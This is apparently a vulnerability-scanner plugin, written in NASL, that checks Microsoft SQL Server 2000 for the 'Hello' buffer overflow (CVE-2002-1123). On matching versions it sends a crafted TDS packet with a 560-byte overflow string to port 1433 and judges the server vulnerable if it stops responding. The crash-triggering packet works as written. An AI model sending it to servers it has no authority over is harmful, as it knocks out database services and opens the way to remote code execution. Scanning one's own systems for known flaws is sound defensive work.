if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11067" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 5411 );
	script_cve_id( "CVE-2002-1123" );
	script_xref( name: "IAVA", value: "2002-B-0007" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Microsoft's SQL Hello Overflow" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2002 Dave Aitel" );
	script_family( "Databases" );
	script_dependencies( "mssqlserver_detect.sc", "mssql_version.sc" );
	script_mandatory_keys( "MS/SQLSERVER/Running", "mssql/SQLVersion" );
	script_require_ports( 1433, "Services/mssql" );
	script_xref( name: "URL", value: "http://support.microsoft.com/default.aspx?scid=kb;en-us;Q316333&sd=tech" );
	script_tag( name: "summary", value: "The remote MS SQL server is vulnerable to the Hello overflow." );
	script_tag( name: "solution", value: "Install Microsoft Patch Q316333 or disable the Microsoft SQL
  Server service or use a firewall to protect the MS SQL port (1433)." );
	script_tag( name: "impact", value: "An attacker may use this flaw to execute commands against
  the remote host as LOCAL/SYSTEM, as well as read your database content." );
	script_tag( name: "qod", value: "30" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 1433, proto: "mssql" );
version = get_kb_item( "mssql/SQLVersion" );
if(!version){
	exit( 0 );
}
if(version == "8.00.194" || version == "8.00.384" || version == "8.00.532" || version == "8.00.760" || version == "8.00.2039" || version == "8.00.2305"){
	soc = open_sock_tcp( port );
	if(!soc){
		exit( 0 );
	}
	pkt_hdr = raw_string( 0x12, 0x01, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x15, 0x00, 0x06, 0x01, 0x00, 0x1b, 0x00, 0x01, 0x02, 0x00, 0x1c, 0x00, 0x0c, 0x03, 0x00, 0x28, 0x00, 0x04, 0xff, 0x08, 0x00, 0x02, 0x10, 0x00, 0x00, 0x00 );
	pkt_tail = raw_string( 0x00, 0x24, 0x01, 0x00, 0x00 );
	attack_string = crap( 560 );
	sql_packet = NASLString( pkt_hdr, attack_string, pkt_tail );
	send( socket: soc, data: sql_packet );
	r = recv( socket: soc, length: 4096 );
	close( soc );
	if(!r){
		security_message( port: port );
		exit( 0 );
	}
	exit( 99 );
}
exit( 0 );

